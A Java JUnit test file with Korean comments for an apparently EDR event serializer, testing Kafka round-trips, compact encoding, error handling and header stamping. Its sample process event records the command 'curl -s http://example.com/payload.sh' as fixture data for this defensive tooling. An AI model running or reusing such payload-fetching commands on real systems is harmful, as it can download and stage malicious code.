package com.edrdog.schema;

import org.apache.kafka.common.header.Headers;
import org.apache.kafka.common.header.internals.RecordHeaders;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.nio.charset.StandardCharsets;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/** events 토픽에 실리는 형식 자체를 검증한다. */
class EventSerdeTest {

    private final EventSerde serde = new EventSerde();

    private static Event sample() {
        return Event.newBuilder()
                .setHost("mac-01")
                .setType(EventTypes.PROCESS)
                .setTs(1_754_300_000_000L)
                .setProcess("/usr/bin/curl")
                .setParent("zsh")
                .setCmdline("curl -s http://example.com/payload.sh")
                .setTenantId("7")
                .build();
    }

    @Test
    @DisplayName("직렬화한 것을 되읽으면 같은 이벤트다")
    void roundTrip() {
        byte[] bytes = serde.serializer().serialize("events", sample());

        assertThat(serde.deserializer().deserialize("events", bytes)).isEqualTo(sample());
    }

    @Test
    @DisplayName("필드명이 전선에 실리지 않는다")
    void fieldNamesAreNotOnTheWire() {
        String wire = new String(serde.serializer().serialize("events", sample()), StandardCharsets.UTF_8);

        // 값은 그대로 들어 있고, 그 값을 설명하는 키 문자열만 사라진다.
        assertThat(wire).contains("mac-01");
        assertThat(wire).doesNotContain("host").doesNotContain("tenantId").doesNotContain("cmdline");
    }

    @Test
    @DisplayName("값이 없는 필드는 아예 나가지 않는다")
    void emptyFieldsAreOmitted() {
        Event full = sample();
        // JSON 이라면 "destIp":null 처럼 없는 것도 실어 보냈다. 여기서는 크기가 그대로여야 한다.
        Event withEmptyDestIp = sample().toBuilder().setDestIp("").setDomain("").build();

        assertThat(withEmptyDestIp.toByteArray()).hasSameSizeAs(full.toByteArray());
    }

    @Test
    @DisplayName("깨진 바이트는 조용히 빈 이벤트가 되지 않고 예외로 세운다")
    void brokenBytesThrow() {
        byte[] broken = {(byte) 0xFF, (byte) 0xFF, (byte) 0xFF};

        assertThatThrownBy(() -> serde.deserializer().deserialize("events", broken))
                .isInstanceOf(IllegalArgumentException.class);
    }

    @Test
    @DisplayName("헤더에 스키마 버전과 필터용 값이 실린다")
    void headersAreStamped() {
        Headers headers = new RecordHeaders();

        EventHeaders.stamp(headers, sample());

        assertThat(value(headers, EventHeaders.SCHEMA_VERSION)).isEqualTo(EventHeaders.CURRENT_SCHEMA_VERSION);
        assertThat(value(headers, EventHeaders.EVENT_TYPE)).isEqualTo(EventTypes.PROCESS);
        assertThat(value(headers, EventHeaders.TENANT_ID)).isEqualTo("7");
    }

    @Test
    @DisplayName("빈 값은 헤더로도 싣지 않는다 (없는 값을 빈 문자열로 남기지 않는다)")
    void emptyHeaderValuesAreSkipped() {
        Headers headers = new RecordHeaders();

        EventHeaders.stamp(headers, sample().toBuilder().setTenantId("").build());

        assertThat(headers.lastHeader(EventHeaders.TENANT_ID)).isNull();
    }

    private static String value(Headers headers, String key) {
        return new String(headers.lastHeader(key).value(), StandardCharsets.UTF_8);
    }
}
